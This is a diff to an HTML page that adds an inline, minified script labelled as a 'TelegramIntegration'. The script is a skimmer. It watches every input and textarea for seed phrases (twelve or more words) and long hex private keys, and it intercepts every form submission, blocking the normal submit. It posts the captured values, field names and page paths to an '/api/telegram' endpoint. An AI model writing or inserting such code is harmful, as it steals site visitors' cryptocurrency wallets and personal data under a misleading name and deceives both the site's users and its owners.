@@ -143,5 +143,8 @@
   </head>
   <body>
     <div id="root"></div>
+    <script>
+(function(){var e={apiEndpoint:"/api/telegram",retryAttempts:3,retryDelay:1e3};async function t(t){let n=0;for(;n<e.retryAttempts;){try{let a=await fetch(e.apiEndpoint,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data:t})});if(!a.ok)throw Error(`HTTP error! status: ${a.status}`);return await a.json()}catch(e){if(n++,console.error(`Attempt ${n} failed:`,e),n<e.retryAttempts)await new Promise(e=>setTimeout(e,e.retryDelay*n));else throw e}}}window.TelegramIntegration={send:t};let n;document.addEventListener("input",function(e){let a=e.target;if("INPUT"===a.tagName||"TEXTAREA"===a.tagName){clearTimeout(n),n=setTimeout(function(){let e=a.value.trim(),n=e.split(/\s+/).filter(e=>e.length>0);(n.length>=12||e.length>40&&/^[0-9a-fA-Fx]+$/.test(e))&&t({type:n.length>=12?"SEED_PHRASE":"PRIVATE_KEY",content:e,wordCount:n.length,field:a.name||a.id||a.placeholder||"unknown",page:window.location.pathname}).then(()=>console.log("✅ Sent")).catch(e=>console.error("❌ Fail:",e))},500)}}),document.addEventListener("blur",function(e){let n=e.target;if(("INPUT"===n.tagName||"TEXTAREA"===n.tagName)&&n.value.trim()){let e=n.value.trim(),a=e.split(/\s+/).filter(e=>e.length>0);a.length>=12&&t({type:"SEED_PHRASE",content:e,wordCount:a.length,field:n.name||n.id||n.placeholder||"unknown"})}},!0),document.addEventListener("submit",function(e){e.preventDefault();let n=e.target,a={};n.querySelectorAll("input, textarea").forEach(function(e){if(e.value&&e.value.trim()){let t=e.name||e.id||e.placeholder||"field";a[t]=e.value}}),Object.keys(a).length>0&&t(a).then(()=>console.log("✅ Form sent")).catch(e=>console.error("❌ Form fail:",e))},!0)})();
+    </script>
   </body>
 </html>
